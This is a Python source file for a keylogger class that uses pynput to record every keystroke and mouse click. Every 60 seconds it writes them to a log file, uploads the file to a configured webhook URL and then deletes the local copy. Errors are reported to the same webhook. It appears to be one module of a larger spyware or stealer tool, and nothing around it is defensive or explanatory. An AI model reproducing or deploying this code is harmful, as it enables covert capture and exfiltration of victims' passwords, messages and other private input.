from utils import *

from pynput import keyboard, mouse
import time


class InputLogger:
    def __init__(self, software_dir_name, webhook_url):
        self.software_dir_name = software_dir_name
        self.webhook_url = webhook_url
        self.log_file = os.path.join(
            get_logs_path(self.software_dir_name), "input_log.txt"
        )
        self.interval = 60
        self.current_logs = ""

    def on_press(self, key):
        try:
            self.current_logs += f"[{time.time()}] Key pressed: {key.char}\n"
        except AttributeError:
            self.current_logs += f"[{time.time()}] Special key pressed: {key}\n"

    def on_click(self, x, y, button, pressed):
        self.current_logs += (
            f"[{time.time()}] Mouse clicked at ({x}, {y}) with button {button}\n"
        )

    def log_input(self):
        mouse_listener = mouse.Listener(on_click=self.on_click)
        mouse_listener.start()
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        keyboard_listener.start()

    def start(self):
        try:
            self.log_input()
            while True:
                time.sleep(self.interval)
                with open(self.log_file, "w") as f:
                    f.write("Input Logs:\n\n")
                    f.write(self.current_logs)
                    f.close()
                send_webhook(
                    self.webhook_url, file={"input_logs.txt": open(self.log_file, "rb")}
                )
                self.current_logs = ""
                os.remove(self.log_file)
        except Exception as e:
            send_webhook(self.webhook_url, f"```❌ Error logging input: {e}```")
